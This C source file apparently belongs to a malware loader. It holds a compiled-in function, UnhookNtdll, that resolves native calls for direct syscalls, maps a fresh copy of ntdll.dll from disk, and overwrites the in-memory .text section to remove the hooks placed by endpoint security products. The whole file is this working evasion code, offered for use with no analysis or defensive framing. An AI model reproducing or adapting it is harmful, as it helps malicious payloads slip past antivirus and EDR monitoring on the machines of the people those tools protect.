#include "loader_config.h"

#ifdef UNHOOK_DISK

#include <Windows.h>
#include "Structs.h"
#include "Common.h"
#include "Debug.h"

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

#ifndef SEC_IMAGE_NO_EXECUTE
#define SEC_IMAGE_NO_EXECUTE 0x11000000
#endif
#ifndef FILE_OPEN
#define FILE_OPEN 0x00000001
#endif
#ifndef FILE_SYNCHRONOUS_IO_NONALERT
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
#endif

typedef struct _IO_STATUS_BLOCK_LOCAL {
    union { NTSTATUS Status; PVOID Pointer; };
    ULONG_PTR Information;
} IO_STATUS_BLOCK_LOCAL, *PIO_STATUS_BLOCK_LOCAL;

typedef struct _OBJECT_ATTRIBUTES_LOCAL {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES_LOCAL, *POBJECT_ATTRIBUTES_LOCAL;

BOOL UnhookNtdll() {

    // --- Resolve ntdll base from PEB ---
    PTEB pTeb = RtlGetThreadEnvironmentBlock();
    PPEB pPeb = pTeb->ProcessEnvironmentBlock;
    PLDR_DATA_TABLE_ENTRY pEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);
    PVOID pNtdllBase = pEntry->DllBase;

    if (!pNtdllBase)
        return FALSE;

    PIMAGE_EXPORT_DIRECTORY pExportDir = NULL;
    if (!GetImageExportDirectory(pNtdllBase, &pExportDir) || !pExportDir)
        return FALSE;

    // --- Local VX entries (resolved fresh from disk, independent of g_Sys) ---
    DECL_VX(NtCreateFile);
    DECL_VX(NtCreateSection);
    DECL_VX(NtMapViewOfSection);
    DECL_VX(NtProtectVirtualMemory);
    DECL_VX(NtUnmapViewOfSection);
    DECL_VX(NtClose);

    LOAD_VX(pNtdllBase, pExportDir, NtCreateFile);
    LOAD_VX(pNtdllBase, pExportDir, NtCreateSection);
    LOAD_VX(pNtdllBase, pExportDir, NtMapViewOfSection);
    LOAD_VX(pNtdllBase, pExportDir, NtProtectVirtualMemory);
    LOAD_VX(pNtdllBase, pExportDir, NtUnmapViewOfSection);
    LOAD_VX(pNtdllBase, pExportDir, NtClose);

    // --- Open ntdll from disk ---
    WCHAR wszPath[] = L"\\??\\C:\\Windows\\System32\\ntdll.dll";
    UNICODE_STRING usDll = {
        .Length        = (USHORT)(sizeof(wszPath) - sizeof(WCHAR)),
        .MaximumLength = (USHORT)sizeof(wszPath),
        .Buffer        = wszPath
    };

    OBJECT_ATTRIBUTES_LOCAL oa = {
        .Length                   = sizeof(OBJECT_ATTRIBUTES_LOCAL),
        .RootDirectory            = NULL,
        .ObjectName               = &usDll,
        .Attributes               = 0,
        .SecurityDescriptor       = NULL,
        .SecurityQualityOfService = NULL
    };

    IO_STATUS_BLOCK_LOCAL iosb = { 0 };
    HANDLE   hFile    = NULL;
    HANDLE   hSection = NULL;
    PVOID    pClean   = NULL;
    SIZE_T   sView    = 0;
    NTSTATUS STATUS   = 0;

    STATUS = SYSCALL(NtCreateFile_e, &hFile, GENERIC_READ | SYNCHRONIZE, &oa, &iosb,
                     NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ,
                     FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    if (STATUS != 0) {
#ifdef DEBUG
        PRINTA("[!] NtCreateFile(ntdll) failed: 0x%08X\n", STATUS);
#endif
        return FALSE;
    }

    // --- Map clean copy as SEC_IMAGE_NO_EXECUTE ---
    STATUS = SYSCALL(NtCreateSection_e, &hSection, SECTION_ALL_ACCESS, NULL, NULL,
                     PAGE_READONLY, SEC_IMAGE_NO_EXECUTE, hFile);
    if (STATUS != 0) {
#ifdef DEBUG
        PRINTA("[!] NtCreateSection failed: 0x%08X\n", STATUS);
#endif
        SYSCALL(NtClose_e, hFile);
        return FALSE;
    }

    STATUS = SYSCALL(NtMapViewOfSection_e, hSection, (HANDLE)-1, &pClean, NULL, 0, NULL,
                     &sView, ViewShare, 0, PAGE_READONLY);
    if (STATUS != 0) {
#ifdef DEBUG
        PRINTA("[!] NtMapViewOfSection failed: 0x%08X\n", STATUS);
#endif
        SYSCALL(NtClose_e, hSection);
        SYSCALL(NtClose_e, hFile);
        return FALSE;
    }

    // --- Walk PE headers to locate .text in both views ---
    PIMAGE_DOS_HEADER     pDos = (PIMAGE_DOS_HEADER)pNtdllBase;
    PIMAGE_NT_HEADERS     pNth = (PIMAGE_NT_HEADERS)((PBYTE)pNtdllBase + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNth);

    PVOID  pHookedText = NULL;
    PVOID  pCleanText  = NULL;
    SIZE_T sTextSize   = 0;

    for (WORD i = 0; i < pNth->FileHeader.NumberOfSections; i++, pSec++) {
        if (pSec->Name[0] == '.' && pSec->Name[1] == 't' &&
            pSec->Name[2] == 'e'  && pSec->Name[3] == 'x' && pSec->Name[4] == 't') {
            pHookedText = (PVOID)((PBYTE)pNtdllBase + pSec->VirtualAddress);
            pCleanText  = (PVOID)((PBYTE)pClean     + pSec->VirtualAddress);
            sTextSize   = pSec->Misc.VirtualSize;
            break;
        }
    }

    if (!pHookedText || !sTextSize) {
        SYSCALL(NtUnmapViewOfSection_e, (HANDLE)-1, pClean);
        SYSCALL(NtClose_e, hSection);
        SYSCALL(NtClose_e, hFile);
        return FALSE;
    }

    // --- Restore .text: RW → overwrite → restore original protection ---
    PVOID  pTextRegion = pHookedText;
    SIZE_T sRegion     = sTextSize;
    ULONG  ulOldProt   = 0;

    STATUS = SYSCALL(NtProtectVirtualMemory_e, (HANDLE)-1, &pTextRegion, &sRegion, PAGE_EXECUTE_READWRITE, &ulOldProt);
    if (STATUS != 0) {
#ifdef DEBUG
        PRINTA("[!] NtProtectVirtualMemory(RWX) failed: 0x%08X\n", STATUS);
#endif
        SYSCALL(NtUnmapViewOfSection_e, (HANDLE)-1, pClean);
        SYSCALL(NtClose_e, hSection);
        SYSCALL(NtClose_e, hFile);
        return FALSE;
    }

    _memcpy(pHookedText, pCleanText, sTextSize);

    pTextRegion = pHookedText;
    sRegion     = sTextSize;
    ULONG ulDummy = 0;
    SYSCALL(NtProtectVirtualMemory_e, (HANDLE)-1, &pTextRegion, &sRegion, ulOldProt, &ulDummy);

#ifdef DEBUG
    PRINTA("[+] ntdll .text restored (%zu bytes)\n", sTextSize);
#endif

    SYSCALL(NtUnmapViewOfSection_e, (HANDLE)-1, pClean);
    SYSCALL(NtClose_e, hSection);
    SYSCALL(NtClose_e, hFile);

    return TRUE;
}

#endif // UNHOOK_DISK
